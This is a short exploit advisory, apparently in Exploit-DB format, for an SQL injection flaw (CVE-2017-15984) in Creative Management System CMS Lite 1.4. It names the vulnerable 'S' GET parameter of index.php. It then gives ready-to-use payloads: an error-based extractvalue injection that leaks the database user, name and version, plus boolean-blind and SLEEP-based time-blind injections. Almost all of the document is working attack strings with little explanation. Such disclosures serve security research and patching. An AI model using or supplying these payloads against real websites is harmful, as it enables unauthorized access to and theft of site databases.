@@ -1,0 +1,36 @@
+# # # # # 
+# Exploit Title: Creative Management System - CMS Lite 1.4 - SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://bekirk.co.uk/
+# Software Link: https://codecanyon.net/item/creative-management-system-cms-lite/15297597
+# Demo: http://demo.bekirk.co.uk/
+# Version: 1.4
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15984
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/index.php?S=[SQL]
+# 
+# '+/*!50000Procedure*/+/*!50000Analyse*/+(extractvalue(0,/*!50000concat*/(0x27,0x3a,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()))),0)--+-
+# 
+# Parameter: S (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: S=BeDark' AND 7998=7998 AND 'QNRN'='QNRN
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: S=BeDark' AND SLEEP(5) AND 'DmYc'='DmYc
+# 	
+# Etc..
+# # # # #
